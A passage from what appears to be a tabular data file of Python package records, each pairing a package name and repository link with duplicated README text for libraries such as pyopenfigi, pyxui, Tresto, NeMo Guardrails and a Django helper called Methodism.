| security_type_2           |          | str  | `""Common Stock""`                         |
| include_unlisted_equities |          | bool |                                          |
| option_type               |          | str  | `""Call""`                                 | 
| strike                    |          | list | `[100, 200]`                             |
| contract_size             |          | list | `[0, 100]`                               |
| coupon                    |          | list | `[0, 2.5]`                               |
| expiration                |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| maturity                  |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| state_code                |          | str  | `""AZ""`                                   |

Example

```python
from pyopenfigi import OpenFigi, Query

query = Query(query=""SJIM"")
results = OpenFigi().filter(query)
```

In order to know the total number of matches for a given query before starting to request them, it is possible to use 
the `get_total_number_of_matches()` method:

```python
from pyopenfigi import OpenFigi, Query

query = Query(query=""SJIM"")
number_of_results = OpenFigi().get_total_number_of_matches(query)

>>> number_of_results
36
```


## Troubleshooting

Several kinds of errors can occur.

* `ValidationError`: the `MappingJob` and `Query` objects are modeled using **Pydantic** and therefore need to be
  properly instantiated. If an error occurs, a `pydantic.exceptions.ValidationError` will be raised.

* `HTTPError`: in case the status code of the HTTP response is not 200, an HTTPError exception will be raised. Note:
  in case a particular symbol is not found, the API will still respond with a status 200 and a `MappingNotFound`
  object. HTTP errors only occur if there is a real error like a malformed `MappingJob` request (which should not
  happen since all `MappingJob` objects are checked by **Pydantic** prior to being sent), a rate limitation or an
  internal server error.

Here is how to check for `ValidationError` in case the mapping jobs are instantiated programmatically:

```python3
from pydantic import ValidationError

from pyopenfigi import MappingJob

tickers = [""IBM"", ""XRX"", ""TSLA"", None, ""MSFT""]

mapping_jobs = []
for ticker in tickers:
    try:
        mapping_job = MappingJob(id_type=""TICKER"", id_value=ticker, exch_code=""US"")
        mapping_jobs.append(mapping_job)
    except ValidationError:
        print(f""Error when trying to build a MappingJob with {ticker=}"")
        # Do something
        continue
```

And here is how to check for `HTTPError` in case exceptions need to be handled:

```python
from pyopenfigi import OpenFigi, MappingJob
from pyopenfigi.exceptions import HTTPError

mapping_jobs = [MappingJob(id_type=""TICKER"", id_value=""IBM"", exch_code=""US"")]

try:
    results = OpenFigi().map(mapping_jobs)
except HTTPError as e:
    print(f""{e}"")
    # Do something
```
","## pyopenfigi

![Python 3.10](https://img.shields.io/badge/python-3.10-blue)
![Black](https://img.shields.io/badge/code%20style-black-black)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Python wrapper for the [OpenFIGI API](https://www.openfigi.com/api) v3.

## Table of contents

- [About OpenFIGI](#about-openfigi)
- [Installation](#installation)
- [API key](#api-key)
- [Mapping](#mapping)
- [Filtering](#filtering)
- [Troubleshooting](#troubleshooting)

## About OpenFIGI

- The **F**inancial **I**nstrument **G**lobal **I**dentifier (FIGI) is a universal system for identifying instruments
  globally and across all asset classes
- OpenFIGI is an application programming interface that provides automated access
  to mapping various symbols with their corresponding FIGI. It is available at https://www.openfigi.com/
- [pyopenfigi](https://github.com/tlouarn/pyopenfigi) is a
  thin Python wrapper to access OpenFIGI

The API contains 3 endpoints:

| endpoint | description                                          |
|----------|------------------------------------------------------|
| /mapping | Map third-party identifiers to FIGIs                 |
| /filter  | Filter for FIGIs using keywords and optional filters |
| /search  | Search for FIGIs using keywords and optional filters |

_Note: given that the */search* endpoint is strictly superseded by the */filter* endpoint, we
choose not to include it in the wrapper._

## Installation

**pyopenfigi** is published on [PyPI](https://pypi.org/project/pyopenfigi/). To install it, simply run:

```commandline
pip install pyopenfigi
```

## API key

The API can be used with or without API key.
Getting an API key is free and loosens the [rate limits](https://www.openfigi.com/api#rate-limit).

When instantiating the wrapper, the API key is optional:

```python
from pyopenfigi import OpenFigi

wrapper = OpenFigi()
wrapper = OpenFigi(api_key=""XXXXXXXXXX"")
```

## Mapping

The `map()` method takes a list of `MappingJob` as argument and returns a list of `MappingJobResult`. The
result of the request at index `i` in the list of mapping jobs is located at index `i` in the list of results.

```python
from pyopenfigi import OpenFigi, MappingJob

mapping_job = MappingJob(id_type=""TICKER"", id_value=""IBM"", exch_code=""US"")
mapping_jobs = [mapping_job]
results = OpenFigi().map(mapping_jobs)

>>> results
[
    MappingJobResultFigiList(
        data = [
            FigiResult(
                  figi='BBG000BLNNH6', 
                  security_type='Common Stock', 
                  market_sector='Equity', 
                  ticker='IBM', 
                  name='INTL BUSINESS MACHINES CORP', 
                  exch_code='US', 
                  share_class_figi='BBG001S5S399', 
                  composite_figi='BBG000BLNNH6', 
                  security_type2='Common Stock', 
                  security_description='IBM', 
                  metadata=None
            )
        ]
    )
]
```

A `MappingJobResult` can either be a `MappingJobResultFigiList`, a `MappingJobResultFigiNotFound` or a
`MappingJobResultError`.

The `MappingJob` object has 2 required properties which are `id_type` and `id_value`. The other properties are optional
but subject to specific rules in case they are provided. These rules are modeled and checked using **Pydantic**.

Below is the full list of properties for `MappingJob`:

| property                  | required | type | example                                  |
|---------------------------|----------|------|------------------------------------------|
| id_type                   | X        | str  | `""TICKER""`                               |
| id_value                  | X        | str  | `""IBM""`                                  |
| exch_code                 |          | str  | `""UN""`                                   |
| mic_code                  |          | str  | `""XNYS""`                                 |
| currency                  |          | str  | `""USD""`                                  |
| market_sec_des            |          | str  | `""Equity""`                               |
| security_type             |          | str  | `""Common Stock""`                         |
| security_type_2           |          | str  | `""Common Stock""`                         |
| include_unlisted_equities |          | bool |                                          |
| option_type               |          | str  | `""Call""`                                 | 
| strike                    |          | list | `[100, 200]`                             |
| contract_size             |          | list | `[0, 100]`                               |
| coupon                    |          | list | `[0, 2.5]`                               |
| expiration                |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| maturity                  |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| state_code                |          | str  | `""AZ""`                                   |

Some of the properties in the `MappingJob` are ""enum-like"". For each of these properties, it is possible to
retrieve the current list of accepted values via specific methods:

| property        | method                   | examples |
|-----------------|--------------------------|----------|
| id_type         | `get_id_types()`         |          |
| exch_code       | `get_exch_codes()`       |          |
| mic_code        | `get_mic_codes()`        |          |
| currency        | `get_currencies()`       |          |
| market_sec_des  | `get_market_sec_des()`   |          |
| security_type   | `get_security_types()`   |          |
| security_type_2 | `get_security_types_2()` |          |
| state_code      | `get_state_codes()`      |          |

For example, to retrieve the current values for `id_type`:

```python
from pyopenfigi import OpenFigi

id_types = OpenFigi().get_id_types()
```

## Filtering

The `filter()` method takes a `Query` object as argument and returns a list of `FigiResult`.

* The `Query` object is very similar to the `MappingJob` object 
* The only difference are that the `id_type` and `id_value` are replaced by a single `query` property
* All the ""enum-like"" properties are the same and the list of accepted values is the same
* The maximum number of results is limited to 15,000

| property                  | required | type | example                                  |
|---------------------------|----------|------|------------------------------------------|
| query                     | X        | str  | `""SJIM""`                                 |
| exch_code                 |          | str  | `""UN""`                                   |
| mic_code                  |          | str  | `""XNYS""`                                 |
| currency                  |          | str  | `""USD""`                                  |
| market_sec_des            |          | str  | `""Equity""`                               |
| security_type             |          | str  | `""Common Stock""`                         |
| security_type_2           |          | str  | `""Common Stock""`                         |
| include_unlisted_equities |          | bool |                                          |
| option_type               |          | str  | `""Call""`                                 | 
| strike                    |          | list | `[100, 200]`                             |
| contract_size             |          | list | `[0, 100]`                               |
| coupon                    |          | list | `[0, 2.5]`                               |
| expiration                |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| maturity                  |          | list | `[date(2023, 6, 1), date(2023, 12, 31)]` |
| state_code                |          | str  | `""AZ""`                                   |

Example

```python
from pyopenfigi import OpenFigi, Query

query = Query(query=""SJIM"")
results = OpenFigi().filter(query)
```

In order to know the total number of matches for a given query before starting to request them, it is possible to use 
the `get_total_number_of_matches()` method:

```python
from pyopenfigi import OpenFigi, Query

query = Query(query=""SJIM"")
number_of_results = OpenFigi().get_total_number_of_matches(query)

>>> number_of_results
36
```


## Troubleshooting

Several kinds of errors can occur.

* `ValidationError`: the `MappingJob` and `Query` objects are modeled using **Pydantic** and therefore need to be
  properly instantiated. If an error occurs, a `pydantic.exceptions.ValidationError` will be raised.

* `HTTPError`: in case the status code of the HTTP response is not 200, an HTTPError exception will be raised. Note:
  in case a particular symbol is not found, the API will still respond with a status 200 and a `MappingNotFound`
  object. HTTP errors only occur if there is a real error like a malformed `MappingJob` request (which should not
  happen since all `MappingJob` objects are checked by **Pydantic** prior to being sent), a rate limitation or an
  internal server error.

Here is how to check for `ValidationError` in case the mapping jobs are instantiated programmatically:

```python3
from pydantic import ValidationError

from pyopenfigi import MappingJob

tickers = [""IBM"", ""XRX"", ""TSLA"", None, ""MSFT""]

mapping_jobs = []
for ticker in tickers:
    try:
        mapping_job = MappingJob(id_type=""TICKER"", id_value=ticker, exch_code=""US"")
        mapping_jobs.append(mapping_job)
    except ValidationError:
        print(f""Error when trying to build a MappingJob with {ticker=}"")
        # Do something
        continue
```

And here is how to check for `HTTPError` in case exceptions need to be handled:

```python
from pyopenfigi import OpenFigi, MappingJob
from pyopenfigi.exceptions import HTTPError

mapping_jobs = [MappingJob(id_type=""TICKER"", id_value=""IBM"", exch_code=""US"")]

try:
    results = OpenFigi().map(mapping_jobs)
except HTTPError as e:
    print(f""{e}"")
    # Do something
```
",tlouarn/pyopenfigi
pyxui,https://github.com/staliox/pyxui,0,4632,4632,"# PyXUI 
An application with python that allows you to modify your xui panel ([Sanaeii 3x-ui](https://github.com/MHSanaei/3x-ui)) ([alireza0 x-ui](https://github.com/alireza0/x-ui))

## How To Install
```
pip install pyxui
```

## How To Use
- Import pyxui in your .py file
```python
from pyxui import XUI

xui = XUI(""staliox.com"", 54321, True) # Make note if you use https set True else don't set anything
xui = XUI(""staliox.com"", 54321, True, ""6fo3"") # If you set panel path, you can set your panel path string
```

- Login in your panel
```python
from pyxui.errors import BadLogin

try:
  xui.login(USERNAME, PASSWORD)
except BadLogin:
  ...
```

- Get inbounds list
```python
get_inbounds = xui.get_inbounds()

# Result
{
    ""success"": true,
    ""msg"": """",
    ""obj"": [
        {
            ""id"": 1,
            ""up"": 552345026,
            ""down"": 18164200325,
            ""total"": 0,
            ""remark"": ""Staliox"",
            ""enable"": true,
            ""expiryTime"": 0,
            ""clientStats"": [
                {
                    ""id"": 1,
                    ""inboundId"": 1,
                    ""enable"": true,
                    ""email"": ""Me"",
                    ""up"": 191308877,
                    ""down"": 4945030148,
                    ""expiryTime"": 0,
                    ""total"": 0
                }
            ],
            ""listen"": """",
            ""port"": 443,
            ""protocol"": ""vless"",
            ""settings"": ""{\n  \""clients\"": [\n    {\n      \""email\"": \""Me\"",\n      \""enable\"": true,\n      \""expiryTime\"": 0,\n      \""flow\"": \""\"",\n      \""id\"": \""c6419651-68d7-gfhg-d611-32v5df41g105\"",\n      \""limitIp\"": 0,\n      \""subId\"": \""\"",\n      \""tgId\"": \""@staliox\"",\n      \""totalGB\"": 0\n    }\n  ],\n  \""decryption\"": \""none\"",\n  \""fallbacks\"": []\n}"",
            ""tag"": ""inbound-443"",
            ""sniffing"": ""{\n  \""enabled\"": true,\n  \""destOverride\"": [\n    \""http\"",\n    \""tls\""\n  ]\n}""
        }
    ]
}
```

- Add client to exist inbound
```python
get = xui.add_client(
    inbound_id=1,
    email=""fdsfgf@gmal.com"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"",
    enable = True,
    flow = """",
    limit_ip = 0,
    total_gb = 5368709120,
    expire_time = 1684948641772,
    telegram_id = """",
    subscription_id = """"
)
```

- Get client information:
```python
get_client = xui.get_client(
    inbound_id=1,
    email=""Me"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"" # Make note you don't have to pass both of them (emaill, uuid), just one is enough
)

# Result
{
    'id': 1,
    'inboundId': 1,
    'enable': True,
    'email': 'Me',
    'up': 194895832,
    'down': 4959786483,
    'expiryTime': 0,
    'total': 0
}
```

- Delete client from exist inbound:
```python
get_client = xui.delete_client(
    inbound_id=1,
    email=""Me"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"" # Make note you don't have to pass both of them (email, uuid), just one is enough
)

# Create vmess and vless config string
- Import config_generator
```python
from pyxui.config_gen import config_generator
```

- VMESS:
```python
config = {
    ""v"": ""2"",
    ""ps"": ""Staliox-Me"",
    ""add"": ""staliox.com"",
    ""port"": ""443"",
    ""id"": ""a85def57-0a86-43d1-b15c-0494519067c6"",
    ""aid"": ""0"",
    ""scy"": ""auto"",
    ""net"": ""tcp"",
    ""type"": ""ws"",
    ""host"": ""staliox.site"",
    ""path"": ""/"",
    ""tls"": ""tls"",
    ""sni"": ""staliox.site"",
    ""alpn"": ""h2,http/1.1"",
    ""fp"": ""chrome""
}

generate_config = config_generator(""vmess"", config)

# Result
vmess://eyJ2IjogIjIiLCAicHMiOiAiU3RhbGlveC1NZSIsICJhZGQiOiAic3RhbGlveC5jb20iLCAicG9ydCI6ICI0NDMiLCAiaWQiOiAiYTg1ZGVmNTctMGE4Ni00M2QxLWIxNWMtMDQ5NDUxOTA2N2M2IiwgImFpZCI6ICIwIiwgInNjeSI6ICJhdXRvIiwgIm5ldCI6ICJ0Y3AiLCAidHlwZSI6ICJ3cyIsICJob3N0IjogInN0YWxpb3guc2l0ZSIsICJwYXRoIjogIi8iLCAidGxzIjogInRscyIsICJzbmkiOiAic3RhbGlveC5zaXRlIiwgImFscG4iOiAiaDIsaHR0cC8xLjEiLCAiZnAiOiAiY2hyb21lIn0=
```

- VLESS:
```python
config = {
    ""ps"": ""Staliox-Me"",
    ""add"": ""staliox.com"",
    ""port"": ""443"",
    ""id"": ""a85def57-0a86-43d1-b15c-0494519067c6""
}

data = {
    ""security"": ""tls"",
    ""type"": ""ws"",
    ""host"": ""staliox.site"",
    ""path"": ""/"",
    ""sni"": ""staliox.site"",
    ""alpn"": ""h2,http/1.1"",
    ""fp"": ""chrome""
}

generate_config = config_generator(""vless"", config, data)

# Result
vless://a85def57-0a86-43d1-b15c-0494519067c6@staliox.com:443?security=tls&type=ws&host=staliox.site&path=%2F&tls=tls&sni=staliox.site&alpn=h2%2Chttp%2F1.1&fp=chrome#Staliox-Me
```
","# PyXUI 
An application with python that allows you to modify your xui panel ([Sanaeii 3x-ui](https://github.com/MHSanaei/3x-ui)) ([alireza0 x-ui](https://github.com/alireza0/x-ui))

## How To Install
```
pip install pyxui
```

## How To Use
- Import pyxui in your .py file
```python
from pyxui import XUI

xui = XUI(""staliox.com"", 54321, True) # Make note if you use https set True else don't set anything
xui = XUI(""staliox.com"", 54321, True, ""6fo3"") # If you set panel path, you can set your panel path string
```

- Login in your panel
```python
from pyxui.errors import BadLogin

try:
  xui.login(USERNAME, PASSWORD)
except BadLogin:
  ...
```

- Get inbounds list
```python
get_inbounds = xui.get_inbounds()

# Result
{
    ""success"": true,
    ""msg"": """",
    ""obj"": [
        {
            ""id"": 1,
            ""up"": 552345026,
            ""down"": 18164200325,
            ""total"": 0,
            ""remark"": ""Staliox"",
            ""enable"": true,
            ""expiryTime"": 0,
            ""clientStats"": [
                {
                    ""id"": 1,
                    ""inboundId"": 1,
                    ""enable"": true,
                    ""email"": ""Me"",
                    ""up"": 191308877,
                    ""down"": 4945030148,
                    ""expiryTime"": 0,
                    ""total"": 0
                }
            ],
            ""listen"": """",
            ""port"": 443,
            ""protocol"": ""vless"",
            ""settings"": ""{\n  \""clients\"": [\n    {\n      \""email\"": \""Me\"",\n      \""enable\"": true,\n      \""expiryTime\"": 0,\n      \""flow\"": \""\"",\n      \""id\"": \""c6419651-68d7-gfhg-d611-32v5df41g105\"",\n      \""limitIp\"": 0,\n      \""subId\"": \""\"",\n      \""tgId\"": \""@staliox\"",\n      \""totalGB\"": 0\n    }\n  ],\n  \""decryption\"": \""none\"",\n  \""fallbacks\"": []\n}"",
            ""tag"": ""inbound-443"",
            ""sniffing"": ""{\n  \""enabled\"": true,\n  \""destOverride\"": [\n    \""http\"",\n    \""tls\""\n  ]\n}""
        }
    ]
}
```

- Add client to exist inbound
```python
get = xui.add_client(
    inbound_id=1,
    email=""fdsfgf@gmal.com"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"",
    enable = True,
    flow = """",
    limit_ip = 0,
    total_gb = 5368709120,
    expire_time = 1684948641772,
    telegram_id = """",
    subscription_id = """"
)
```

- Get client information:
```python
get_client = xui.get_client(
    inbound_id=1,
    email=""Me"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"" # Make note you don't have to pass both of them (emaill, uuid), just one is enough
)

# Result
{
    'id': 1,
    'inboundId': 1,
    'enable': True,
    'email': 'Me',
    'up': 194895832,
    'down': 4959786483,
    'expiryTime': 0,
    'total': 0
}
```

- Delete client from exist inbound:
```python
get_client = xui.delete_client(
    inbound_id=1,
    email=""Me"",
    uuid=""5d3d1bac-49cd-4b66-8be9-a728efa205fa"" # Make note you don't have to pass both of them (email, uuid), just one is enough
)

# Create vmess and vless config string
- Import config_generator
```python
from pyxui.config_gen import config_generator
```

- VMESS:
```python
config = {
    ""v"": ""2"",
    ""ps"": ""Staliox-Me"",
    ""add"": ""staliox.com"",
    ""port"": ""443"",
    ""id"": ""a85def57-0a86-43d1-b15c-0494519067c6"",
    ""aid"": ""0"",
    ""scy"": ""auto"",
    ""net"": ""tcp"",
    ""type"": ""ws"",
    ""host"": ""staliox.site"",
    ""path"": ""/"",
    ""tls"": ""tls"",
    ""sni"": ""staliox.site"",
    ""alpn"": ""h2,http/1.1"",
    ""fp"": ""chrome""
}

generate_config = config_generator(""vmess"", config)

# Result
vmess://eyJ2IjogIjIiLCAicHMiOiAiU3RhbGlveC1NZSIsICJhZGQiOiAic3RhbGlveC5jb20iLCAicG9ydCI6ICI0NDMiLCAiaWQiOiAiYTg1ZGVmNTctMGE4Ni00M2QxLWIxNWMtMDQ5NDUxOTA2N2M2IiwgImFpZCI6ICIwIiwgInNjeSI6ICJhdXRvIiwgIm5ldCI6ICJ0Y3AiLCAidHlwZSI6ICJ3cyIsICJob3N0IjogInN0YWxpb3guc2l0ZSIsICJwYXRoIjogIi8iLCAidGxzIjogInRscyIsICJzbmkiOiAic3RhbGlveC5zaXRlIiwgImFscG4iOiAiaDIsaHR0cC8xLjEiLCAiZnAiOiAiY2hyb21lIn0=
```

- VLESS:
```python
config = {
    ""ps"": ""Staliox-Me"",
    ""add"": ""staliox.com"",
    ""port"": ""443"",
    ""id"": ""a85def57-0a86-43d1-b15c-0494519067c6""
}

data = {
    ""security"": ""tls"",
    ""type"": ""ws"",
    ""host"": ""staliox.site"",
    ""path"": ""/"",
    ""sni"": ""staliox.site"",
    ""alpn"": ""h2,http/1.1"",
    ""fp"": ""chrome""
}

generate_config = config_generator(""vless"", config, data)

# Result
vless://a85def57-0a86-43d1-b15c-0494519067c6@staliox.com:443?security=tls&type=ws&host=staliox.site&path=%2F&tls=tls&sni=staliox.site&alpn=h2%2Chttp%2F1.1&fp=chrome#Staliox-Me
```
",staliox/pyxui
latest-earth-quake-indonesia-chatur,https://github.com/chaturap/bmkg-latest-earthquake,0,399,399,"# bmkg-latest-earthquake
This package will get the latest earthquake (Indonesia) from https://www.bmkg.go.id/  BMKG | Meteorological, Climatological, and Geophysical Agency

example using this module

import gempaterkini_chatur

#    if __name__ == '__main__':
#    print(""Aplikasi Utama"")
#    result = gempaterkini_chatur.ekstrasi_data()
#    gempaterkini_chatur.tampilkan_data(result)
","# bmkg-latest-earthquake
This package will get the latest earthquake (Indonesia) from https://www.bmkg.go.id/  BMKG | Meteorological, Climatological, and Geophysical Agency

example using this module

import gempaterkini_chatur

#    if __name__ == '__main__':
#    print(""Aplikasi Utama"")
#    result = gempaterkini_chatur.ekstrasi_data()
#    gempaterkini_chatur.tampilkan_data(result)
",chaturap/bmkg-latest-earthquake
chinese-webtext-spider,https://github.com/1azybug/chinese-webtext-spider,0,19,19,"一个用于爬取网络中文文本的爬虫工具
","一个用于爬取网络中文文本的爬虫工具
",1azybug/chinese-webtext-spider
thatdslibrary,https://github.com/anhquan0412/that_ds_library,9,18,18,"Some placeholders
","Some placeholders
",anhquan0412/that_ds_library
dbt-odps,https://github.com/ai-excelsior/F2AI,0,31,31,The ODPS adapter plugin for dbt,The ODPS adapter plugin for dbt,ai-excelsior/f2ai
jupyterhub-backendspawner,https://github.com/kreuzert/jupyterhub-backendspawner,2,102,102,"# jupyterhub-backendspawner
Start single-user servers on different systems on a central JupyterHub.


","# jupyterhub-backendspawner
Start single-user servers on different systems on a central JupyterHub.


",kreuzert/jupyterhub-backendspawner
nemoguardrails,https://github.com/NVIDIA/NeMo-Guardrails,14,1027,1027,"NeMo Guardrails is an open-source toolkit for easily adding
    programmable guardrails to LLM-based conversational systems. Guardrails (or ""rails""
    for short) are specific ways of controlling the output of a large language model,
    such as not talking about politics, responding in a particular way to specific user
    requests, following a predefined dialog path, using a particular language style,
    extracting structured data, and more.

    **Key Benefits**
    - **Building Trustworthy, Safe and Secure LLM Conversational Systems:** The core
    value of using NeMo Guardrails is the ability to write rails to guide conversations.
    Developers can choose to define the behavior of their LLM-powered bots on certain
    topics and keep their creativity unencumbered for others!
    - **Connect models, chains, services, and more via actions:** LLMs don't need to solve
    all the challenges. NeMo Guardrails provides the ability to connect your codebase or
    services to your chatbot seamlessly and securely!
","NeMo Guardrails is an open-source toolkit for easily adding
    programmable guardrails to LLM-based conversational systems. Guardrails (or ""rails""
    for short) are specific ways of controlling the output of a large language model,
    such as not talking about politics, responding in a particular way to specific user
    requests, following a predefined dialog path, using a particular language style,
    extracting structured data, and more.

    **Key Benefits**
    - **Building Trustworthy, Safe and Secure LLM Conversational Systems:** The core
    value of using NeMo Guardrails is the ability to write rails to guide conversations.
    Developers can choose to define the behavior of their LLM-powered bots on certain
    topics and keep their creativity unencumbered for others!
    - **Connect models, chains, services, and more via actions:** LLMs don't need to solve
    all the challenges. NeMo Guardrails provides the ability to connect your codebase or
    services to your chatbot seamlessly and securely!
",nvidia/nemo-guardrails
tresto,https://github.com/buanzo/tresto,1,4089,4089,"# Tresto

Tresto is a Python library that integrates with Trello to provide advanced
functionality for unit testing.  With Tresto, you can create Trello cards
for each test automatically, and these cards will be moved to the
appropriate list based on the test results.  This makes Tresto an ideal tool
for test-driven development, as it provides a convenient and visual way to
monitor the progress of your tests.

## Installation

You can install Tresto using pip:

```shell
pip3 install tresto
```

## Usage

Using Tresto is easy.  Simply create a TrestoTestCase and write your tests
as you normally would.  However, you will need to set up your Trello API key
and token as environment variables TRELLO_API_KEY and TRELLO_API_TOKEN.

```python
import unittest
from tresto import TrestoTestCase
# FIX: arithmetic.py is in examples/ folder
from arithmetic import add, subtract, multiply, divide

class TestArithmetic(TrestoTestCase):
    auto_create_board = True
    auto_create_lists = True

    def test_add(self):
        self.assertEqual(add(1, 2), 3)

    def test_subtract(self):
        self.assertEqual(subtract(5, 3), 2)

    def test_multiply(self):
        self.assertEqual(multiply(2, 3), 6)

    def test_divide(self):
        self.assertEqual(divide(6, 3), 2)

    def test_divide_by_zero(self):
        with self.assertRaises(ValueError):
            divide(1, 0)

if __name__ == '__main__':
    unittest.main()
```

You can then run your tests using the standard Python unittest framework.
See the tests/ subdirectory for test_hello_world.py, test_arithmetic.py and test_tresto.py -
Yes, that's Tresto testing itself:

```python
import os
import unittest
from tresto import TrestoTestCase
from trello.exceptions import ResourceUnavailable

class TestTresto(TrestoTestCase):

    def setUp(self):
        self.card_failed = None
        self.card_passed = None

    def test_1_board_setup(self):
        self.assertIsNotNone(self.board)
        self.assertEqual(self.board.name, self.board_name)

    def test_2_list_setup(self):
        self.assertIsNotNone(self.passed_list)
        self.assertIsNotNone(self.failed_list)
        self.assertEqual(self.passed_list.name, self.test_passed_list)
        self.assertEqual(self.failed_list.name, self.test_failed_list)

    def test_3_add_and_delete_cards(self):
        # Test add_card and delete_card for FAILED List
        card_name_failed = ""Test Card for FAILED List""
        self.card_failed = self.add_card(self.failed_list, card_name_failed)
        self.assertEqual(self.card_failed.name, card_name_failed, self.failed_list)
        self.card_failed.delete()
        try:
            deleted_card_failed = self.board.get_card(self.card_failed.id)
            self.fail(""Card was not deleted"")
        except ResourceUnavailable:
            pass

        # Test add_card and delete_card for PASSED List
        card_name_passed = ""Test Card for PASSED List""
        self.card_passed = self.add_card(self.passed_list, card_name_passed)
        self.assertEqual(self.card_passed.name, card_name_passed, self.passed_list)
        self.card_passed.delete()
        try:
            deleted_card_passed = self.board.get_card(self.card_passed.id)
            self.fail(""Card was not deleted"")
        except ResourceUnavailable:
            pass

    def test_4_add_and_move_card_between_lists(self):
        card_name = ""Test Card for Moving Between Lists""
        card = self.add_card(self.passed_list, card_name)
        self.move_card(card, self.failed_list)

        # Refresh card data
        card.fetch()

        self.assertEqual(card.list_id, self.failed_list.id, self.failed_list)
        card.delete()

if __name__ == '__main__':
    unittest.main()
```


## Acknowledgements

Tresto is built using the [py-trello](https://github.com/sarumont/py-trello) library. Thank you to the py-trello developers for their great work!

## Contributing

Contributions are always welcome!  If you find a bug or have a suggestion
for how to improve Tresto, please open an issue [here](https://github.com/buanzo/tresto/issues).
","# Tresto

Tresto is a Python library that integrates with Trello to provide advanced
functionality for unit testing.  With Tresto, you can create Trello cards
for each test automatically, and these cards will be moved to the
appropriate list based on the test results.  This makes Tresto an ideal tool
for test-driven development, as it provides a convenient and visual way to
monitor the progress of your tests.

## Installation

You can install Tresto using pip:

```shell
pip3 install tresto
```

## Usage

Using Tresto is easy.  Simply create a TrestoTestCase and write your tests
as you normally would.  However, you will need to set up your Trello API key
and token as environment variables TRELLO_API_KEY and TRELLO_API_TOKEN.

```python
import unittest
from tresto import TrestoTestCase
# FIX: arithmetic.py is in examples/ folder
from arithmetic import add, subtract, multiply, divide

class TestArithmetic(TrestoTestCase):
    auto_create_board = True
    auto_create_lists = True

    def test_add(self):
        self.assertEqual(add(1, 2), 3)

    def test_subtract(self):
        self.assertEqual(subtract(5, 3), 2)

    def test_multiply(self):
        self.assertEqual(multiply(2, 3), 6)

    def test_divide(self):
        self.assertEqual(divide(6, 3), 2)

    def test_divide_by_zero(self):
        with self.assertRaises(ValueError):
            divide(1, 0)

if __name__ == '__main__':
    unittest.main()
```

You can then run your tests using the standard Python unittest framework.
See the tests/ subdirectory for test_hello_world.py, test_arithmetic.py and test_tresto.py -
Yes, that's Tresto testing itself:

```python
import os
import unittest
from tresto import TrestoTestCase
from trello.exceptions import ResourceUnavailable

class TestTresto(TrestoTestCase):

    def setUp(self):
        self.card_failed = None
        self.card_passed = None

    def test_1_board_setup(self):
        self.assertIsNotNone(self.board)
        self.assertEqual(self.board.name, self.board_name)

    def test_2_list_setup(self):
        self.assertIsNotNone(self.passed_list)
        self.assertIsNotNone(self.failed_list)
        self.assertEqual(self.passed_list.name, self.test_passed_list)
        self.assertEqual(self.failed_list.name, self.test_failed_list)

    def test_3_add_and_delete_cards(self):
        # Test add_card and delete_card for FAILED List
        card_name_failed = ""Test Card for FAILED List""
        self.card_failed = self.add_card(self.failed_list, card_name_failed)
        self.assertEqual(self.card_failed.name, card_name_failed, self.failed_list)
        self.card_failed.delete()
        try:
            deleted_card_failed = self.board.get_card(self.card_failed.id)
            self.fail(""Card was not deleted"")
        except ResourceUnavailable:
            pass

        # Test add_card and delete_card for PASSED List
        card_name_passed = ""Test Card for PASSED List""
        self.card_passed = self.add_card(self.passed_list, card_name_passed)
        self.assertEqual(self.card_passed.name, card_name_passed, self.passed_list)
        self.card_passed.delete()
        try:
            deleted_card_passed = self.board.get_card(self.card_passed.id)
            self.fail(""Card was not deleted"")
        except ResourceUnavailable:
            pass

    def test_4_add_and_move_card_between_lists(self):
        card_name = ""Test Card for Moving Between Lists""
        card = self.add_card(self.passed_list, card_name)
        self.move_card(card, self.failed_list)

        # Refresh card data
        card.fetch()

        self.assertEqual(card.list_id, self.failed_list.id, self.failed_list)
        card.delete()

if __name__ == '__main__':
    unittest.main()
```


## Acknowledgements

Tresto is built using the [py-trello](https://github.com/sarumont/py-trello) library. Thank you to the py-trello developers for their great work!

## Contributing

Contributions are always welcome!  If you find a bug or have a suggestion
for how to improve Tresto, please open an issue [here](https://github.com/buanzo/tresto/issues).
",buanzo/tresto
methodism,https://github.com/xudikk/Methodism,0,2434,2434,"# Methodism
Methodism sizga djangoda API larni tezroq yaratish va tez ishlatish imkoni beradi.  
***Egamberdiyav Xudoyberdi Tomonidan Yaratilgan***

```python
    pip install methodism
```
## About
Ushbu Kutubxona Egamberdiyev Xudoyberdi Tomonidan yaratilgan bo'lib tog'ridan tog'ri django 
kutubxonasi ustiga qurulgan. Bu sizga API lar yozganda uni tez ishlatish va tezroq API yozish imkoni beradi.
Avtomatik tarzda siz yozgan funksiyani method ga aylantirgan holatda api hosil qiladi

### filelar
* ``methodism/costumizing.py``  ushbu file tayyor bir qator claslarni custum holarga o'tqazilgan varianti hisoblandi.  
* ``methodism/decors.py`` Ushbu file kerakli bo'lgan decoratorlarni yozish uchun ishlatiluvchi file.
* ``methodism/error_messages.py`` bo'lishi mumkin bo'lgan xatoliklar yig'ilgan lug'at ko'rinishidagi file.   
* ``methodism/helper.py`` Yordamchi funksiyalar joylangan file.   
* ``methodism/main.py`` Asosiy class yozilgan file



## Ishlatish ketma ketligi

#### Birinchi navbatda kerakli kutubxonalarni o'rnatib olishingiz kerak
#### From GitHub
``` python
  pip install -r requirements.txt
```  
#### From PyPi
``` python
  pip install Django==4.2 django-rest-framework==0.1.0 djangorestframework==3.14.0
```  

Yuklab olib bo'lgach O'zingizga  `views.py` faylida kerakli bo'lgan classni yozing va uni `urls.py` ga ulang,
class ga esa `methodism/main.py` dagi `METHODIZM` classidan vorislik bering.  
### Example in `views.py`


```python
from methodism.main import METHODIZM

# agar bundan foydalansangiz settings.INSTALLED_APPS ga 'rest_framework.authtoken' ni qo'shib qo'ying
from rest_framework.authtoken.models import Token 


class YourClass(METHODIZM):

